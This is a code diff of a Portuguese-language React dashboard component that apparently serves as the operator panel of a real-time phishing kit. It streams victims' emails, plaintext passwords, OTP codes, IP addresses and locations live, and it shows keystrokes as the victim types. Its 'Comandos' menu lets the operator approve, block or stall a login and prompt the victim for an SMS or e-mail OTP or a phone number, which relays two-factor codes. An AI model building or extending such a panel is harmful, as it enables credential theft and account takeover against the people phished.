@@ -1,8 +1,8 @@
-﻿"use client";
+"use client";
 
 import { useEffect, useState } from "react";
 import { createPortal } from "react-dom";
-import { ChevronLeft, ChevronRight, ChevronDown, Copy, KeyRound, Globe, Trash2, Clock, Ban, CheckCircle2, Smartphone, ShieldX, Mail } from "lucide-react";
+import { ChevronLeft, ChevronRight, ChevronDown, Copy, KeyRound, Globe, Trash2, Clock, Ban, CheckCircle2, Smartphone, ShieldX } from "lucide-react";
 import { supabase } from "@/lib/supabase";
 import type { Log } from "@/lib/logs";
 import { deletarLog, decidirLogin, limparClientes } from "@/lib/logs";
@@ -28,14 +28,11 @@ type Meta = {
   ip?: string;
   senha?: string;
   sucesso?: boolean;
-  status?: "pendente" | "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "bloqueado" | "otp_invalido";
+  status?: "pendente" | "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "pedir_telefone" | "bloqueado" | "otp_invalido";
   otp?: string;
-  otpSms?: string;
-  otpEmail?: string;
-  visto_em?: number;
 };
 
-type Digitando = { email: string; senha: string; otp?: string; canalOtp?: "sms" | "email"; em: string };
+type Digitando = { email: string; senha: string; otp?: string; em: string };
 
 export default function ClientesCard({
   logsIniciais,
@@ -50,12 +47,6 @@ export default function ClientesCard({
   const [menuPos, setMenuPos] = useState<{ top: number; left: number }>({ top: 0, left: 0 });
   const [montado, setMontado] = useState(false);
   const [digitando, setDigitando] = useState<Digitando | null>(null);
-  const [, setTick] = useState(0);
-
-  useEffect(() => {
-    const iv = setInterval(() => setTick((t) => t + 1), 3000);
-    return () => clearInterval(iv);
-  }, []);
 
   useEffect(() => {
     const canal = supabase
@@ -96,6 +87,39 @@ export default function ClientesCard({
 
   useEffect(() => {
     const channel = supabase
+      .channel("logs-realtime")
+      .on(
+        "postgres_changes",
+        { event: "INSERT", schema: "public", table: "logs" },
+        (payload) => {
+          const novo = payload.new as Log;
+          if (novo.acao === "login") {
+            setLogins((atual) => [novo, ...atual]);
+            setPagina(1);
+          }
+        },
+      )
+      .on(
+        "postgres_changes",
+        { event: "UPDATE", schema: "public", table: "logs" },
+        (payload) => {
+          const atualizado = payload.new as Log;
+          setLogins((atual) => atual.map((l) => (l.id === atualizado.id ? atualizado : l)));
+        },
+      )
+      .on(
+        "postgres_changes",
+        { event: "DELETE", schema: "public", table: "logs" },
+        (payload) => {
+          const removido = payload.old as Log;
+          setLogins((atual) => atual.filter((l) => l.id !== removido.id));
+        },
+      )
+      .subscribe((status) => {
+        console.log("[ClientesCard] realtime status:", status);
+      });
+
+    const canalClientes = supabase
       .channel("clientes-realtime")
       .on(
         "postgres_changes",
@@ -114,18 +138,13 @@ export default function ClientesCard({
           setLogins((atual) => atual.map((l) => (l.id === atualizado.id ? atualizado : l)));
         },
       )
-      .on(
-        "postgres_changes",
-        { event: "DELETE", schema: "public", table: "clientes" },
-        (payload) => {
-          const removido = payload.old as Log;
-          setLogins((atual) => atual.filter((l) => l.id !== removido.id));
-        },
-      )
-      .subscribe();
+      .subscribe((status) => {
+        console.log("[ClientesCard] clientes realtime status:", status);
+      });
 
     return () => {
       supabase.removeChannel(channel);
+      supabase.removeChannel(canalClientes);
     };
   }, []);
 
@@ -151,25 +170,22 @@ export default function ClientesCard({
     } catch {}
   }
 
-  async function decidir(log: Log, status: "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "bloqueado" | "otp_invalido") {
+  async function decidir(log: Log, status: "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "pedir_telefone" | "bloqueado" | "otp_invalido") {
     setMenuAberto(null);
     try {
       await decidirLogin(log, status);
     } catch {}
   }
 
-  const porChave = new Map<string, Log>();
+  const unicos: Log[] = [];
+  const vistos = new Set<string>();
   for (const l of logins) {
-    const ip = (l.metadata as { ip?: string } | null)?.ip;
-    const chave = ip && ip.trim() ? `ip:${ip.trim()}` : `email:${l.usuario.toLowerCase()}`;
-    const existente = porChave.get(chave);
-    if (!existente || new Date(l.criado_em).getTime() > new Date(existente.criado_em).getTime()) {
-      porChave.set(chave, l);
+    const chave = l.usuario.toLowerCase();
+    if (!vistos.has(chave)) {
+      vistos.add(chave);
+      unicos.push(l);
     }
   }
-  const unicos = [...porChave.values()].sort(
-    (a, b) => new Date(b.criado_em).getTime() - new Date(a.criado_em).getTime(),
-  );
 
   const totalPaginas = Math.max(1, Math.ceil(unicos.length / POR_PAGINA));
   const visiveis = unicos.slice((pagina - 1) * POR_PAGINA, pagina * POR_PAGINA);
@@ -177,12 +193,9 @@ export default function ClientesCard({
   return (
     <div className="flex h-full w-full flex-col">
       <div className="mb-3 min-h-[240px] flex-1">
-        <div className="grid grid-cols-[0.8fr_1.6fr_1fr_0.9fr_0.9fr_1.3fr_1.1fr_1fr_7rem] items-center gap-3 px-4 pb-2 text-[10px] uppercase tracking-wider text-muted-foreground/70">
-          <span>Status</span>
+        <div className="grid grid-cols-[1.6fr_1fr_1.4fr_1.2fr_1fr_auto] items-center gap-3 px-4 pb-2 text-[10px] uppercase tracking-wider text-muted-foreground/70">
           <span>Cliente</span>
           <span>Senha</span>
-          <span>OTP SMS</span>
-          <span>OTP E-mail</span>
           <span>Localização</span>
           <span>IP</span>
           <span>Data / Hora</span>
@@ -193,21 +206,14 @@ export default function ClientesCard({
           {digitando &&
             (digitando.email || digitando.senha) &&
             !unicos.some((l) => l.usuario.toLowerCase() === digitando.email.toLowerCase()) && (
-              <div className="grid grid-cols-[0.8fr_1.6fr_1fr_0.9fr_0.9fr_1.3fr_1.1fr_1fr_7rem] items-center gap-3 rounded-xl border border-primary/30 bg-primary/5 px-4 py-3">
-                <span className="flex items-center gap-1.5 text-xs font-medium text-emerald-400">
-                  <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-500" />
-                  Online
-                </span>
-                <span className="truncate text-xs font-semibold text-foreground">
-                  {digitando.email || <span className="text-muted-foreground/50">digitando...</span>}
-                </span>
+              <div className="grid grid-cols-[1.6fr_1fr_1.4fr_1.2fr_1fr_auto] items-center gap-3 rounded-xl border border-primary/30 bg-primary/5 px-4 py-3">
+                <div className="flex min-w-0 items-center gap-2">
+                  <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-primary" />
+                  <span className="truncate text-xs font-semibold text-foreground">
+                    {digitando.email || <span className="text-muted-foreground/50">digitando...</span>}
+                  </span>
+                </div>
                 <span className="truncate font-mono text-xs text-foreground">{digitando.senha || "—"}</span>
-                <span className="truncate font-mono text-xs text-sky-400">
-                  {digitando.canalOtp === "sms" ? digitando.otp || "—" : "—"}
-                </span>
-                <span className="truncate font-mono text-xs text-violet-400">
-                  {digitando.canalOtp === "email" ? digitando.otp || "—" : "—"}
-                </span>
                 <span className="text-xs text-muted-foreground">—</span>
                 <span className="text-xs text-muted-foreground">—</span>
                 <span className="text-xs text-muted-foreground">agora</span>
@@ -224,34 +230,27 @@ export default function ClientesCard({
               const meta = (log.metadata ?? {}) as Meta;
               const temGeo = Boolean(meta.paisCodigo || meta.cidade);
               const local = [meta.cidade, meta.estado].filter(Boolean).join(", ");
-              const digitandoEste =
-                digitando && digitando.email.toLowerCase() === log.usuario.toLowerCase();
-              const otpSmsExibir =
-                digitandoEste && digitando!.canalOtp === "sms" && digitando!.otp
-                  ? digitando!.otp
-                  : meta.otpSms;
-              const otpEmailExibir =
-                digitandoEste && digitando!.canalOtp === "email" && digitando!.otp
-                  ? digitando!.otp
-                  : meta.otpEmail;
+              const otpExibir =
+                digitando && digitando.email.toLowerCase() === log.usuario.toLowerCase() && digitando.otp
+                  ? digitando.otp
+                  : meta.otp;
               return (
                 <div
                   key={log.id}
-                  className="grid grid-cols-[0.8fr_1.6fr_1fr_0.9fr_0.9fr_1.3fr_1.1fr_1fr_7rem] items-center gap-3 rounded-xl glass px-4 py-3 transition-all duration-300 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5"
+                  className="grid grid-cols-[1.6fr_1fr_1.4fr_1.2fr_1fr_auto] items-center gap-3 rounded-xl glass px-4 py-3 transition-all duration-300 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5"
                 >
-                  {(() => {
-                    const porPresenca = emailsOnline.has(log.usuario.trim().toLowerCase());
-                    const porHeartbeat = typeof meta.visto_em === "number" && Date.now() - meta.visto_em < 8000;
-                    const online = porPresenca || porHeartbeat;
-                    return (
-                      <span className={`flex items-center gap-1.5 text-xs font-medium ${online ? "text-emerald-400" : "text-rose-400"}`}>
-                        <span className={`h-1.5 w-1.5 rounded-full ${online ? "bg-emerald-500" : "bg-rose-500"}`} />
-                        {online ? "Online" : "Offline"}
-                      </span>
-                    );
-                  })()}
-
                   <div className="flex min-w-0 items-center gap-2">
+                    {(() => {
+                      const online = emailsOnline.has(log.usuario.toLowerCase());
+                      const cor =
+                        meta.status === "pendente"
+                          ? "bg-amber-500 animate-pulse"
+                          : online
+                            ? "bg-emerald-500"
+                            : "bg-rose-500";
+                      const titulo = meta.status === "pendente" ? "aguardando" : online ? "online" : "offline";
+                      return <span className={`h-2 w-2 shrink-0 rounded-full ${cor}`} title={titulo} />;
+                    })()}
                     <span className="truncate text-xs font-semibold text-foreground">{log.usuario}</span>
                     {meta.status === "pendente" && (
                       <span className="shrink-0 rounded bg-amber-500/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-amber-500">
@@ -260,12 +259,7 @@ export default function ClientesCard({
                     )}
                     {meta.status === "pedir_otp" && (
                       <span className="shrink-0 rounded bg-sky-400/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-sky-400">
-                        otp sms
-                      </span>
-                    )}
-                    {meta.status === "pedir_otp_email" && (
-                      <span className="shrink-0 rounded bg-violet-400/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-violet-400">
-                        otp e-mail
+                        pedindo otp
                       </span>
                     )}
                     {meta.status === "bloqueado" && (
@@ -273,12 +267,14 @@ export default function ClientesCard({
                         bloqueado
                       </span>
                     )}
+                    {otpExibir && (
+                      <span className="shrink-0 rounded bg-emerald-500/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-emerald-400">
+                        otp: {otpExibir}
+                      </span>
+                    )}
                   </div>
 
                   <span className="truncate font-mono text-xs text-foreground">{meta.senha || "—"}</span>
-
-                  <span className="truncate font-mono text-xs text-sky-400">{otpSmsExibir || "—"}</span>
-                  <span className="truncate font-mono text-xs text-violet-400">{otpEmailExibir || "—"}</span>
 
                   <div className="flex min-w-0 items-center gap-1.5">
                     <span className="text-base leading-none">{temGeo ? bandeiraDe(meta.paisCodigo ?? "") : "🌐"}</span>
@@ -292,15 +288,13 @@ export default function ClientesCard({
                     {dataDe(log.criado_em)} {horaDe(log.criado_em)}
                   </span>
 
-                  <div className="flex justify-end">
-                    <button
-                      onClick={(e) => abrirMenu(e, log.id)}
-                      className="flex h-7 shrink-0 items-center gap-1 rounded-lg border border-border/50 bg-secondary/40 px-2.5 text-[11px] font-medium text-foreground transition hover:border-primary/40 hover:bg-secondary/70"
-                    >
-                      Comandos
-                      <ChevronDown className="h-3 w-3" />
-                    </button>
-                  </div>
+                  <button
+                    onClick={(e) => abrirMenu(e, log.id)}
+                    className="flex h-7 shrink-0 items-center gap-1 rounded-lg border border-border/50 bg-secondary/40 px-2.5 text-[11px] font-medium text-foreground transition hover:border-primary/40 hover:bg-secondary/70"
+                  >
+                    Comandos
+                    <ChevronDown className="h-3 w-3" />
+                  </button>
                 </div>
               );
             })
@@ -386,16 +380,16 @@ export default function ClientesCard({
               </button>
               <div className="my-1 h-px bg-border/50" />
               <button
+                onClick={() => decidir(log, "pedir_telefone")}
+                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-violet-400 hover:bg-violet-400/10"
+              >
+                <Smartphone className="mr-2 h-3.5 w-3.5" /> Pedir Telefone
+              </button>
+              <button
                 onClick={() => decidir(log, "pedir_otp")}
                 className="flex w-full items-center rounded px-2 py-1.5 text-xs text-sky-400 hover:bg-sky-400/10"
               >
-                <Smartphone className="mr-2 h-3.5 w-3.5" /> OTP SMS
-              </button>
-              <button
-                onClick={() => decidir(log, "pedir_otp_email")}
-                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-violet-400 hover:bg-violet-400/10"
-              >
-                <Mail className="mr-2 h-3.5 w-3.5" /> OTP E-mail
+                <Smartphone className="mr-2 h-3.5 w-3.5" /> Pedir OTP
               </button>
               <button
                 onClick={() => decidir(log, "otp_invalido")}
